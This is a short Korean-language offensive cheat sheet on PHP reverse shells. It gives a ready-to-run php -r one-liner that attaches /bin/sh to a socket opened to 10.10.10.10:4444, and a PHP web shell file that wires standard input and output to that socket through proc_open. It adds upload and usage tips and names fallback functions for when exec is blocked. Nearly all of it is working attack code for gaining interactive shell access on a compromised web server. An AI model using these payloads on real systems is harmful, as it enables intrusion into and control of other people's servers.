# linux php reverse shell

> 무엇: php -r의 fsockopen이 연 소켓(FD 3)에 /bin/sh를 붙이는 원라이너와, proc_open으로 표준 입출력을 소켓에 물리는 PHP 웹셸 파일 버전
> 언제: 타깃에 php CLI가 있거나 PHP 웹셸에서 명령 실행이 될 때 웹셸을 인터랙티브 리버스 셸로 승격시킬 때
> 조건: 타깃에 php 존재, 공격자 리스너 사전 실행과 TCP 아웃바운드 허용, 웹셸 파일 버전은 웹 루트 쓰기 권한과 exec 계열 함수 허용 필요(exec가 막혔으면 shell_exec·system·passthru로 교체)

php CLI가 있을 때, 또는 PHP 웹셸에서 실행할 때.

```bash
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- `fsockopen`이 연 소켓은 FD 3으로 열린다.

## PHP 웹셸 파일 버전

```php
<?php
$sock = fsockopen("10.10.10.10", 4444);
proc_open("/bin/sh -i", [0=>$sock, 1=>$sock, 2=>$sock], $pipes);
?>
```

- 웹 루트에 올리고 URL로 한 번 치면 연결된다. 업로드는 [../web-shell/php_webshell.md](../web-shell/php_webshell.md).
- `exec`가 막혀 있으면 `shell_exec`, `system`, `passthru`로 교체한다.
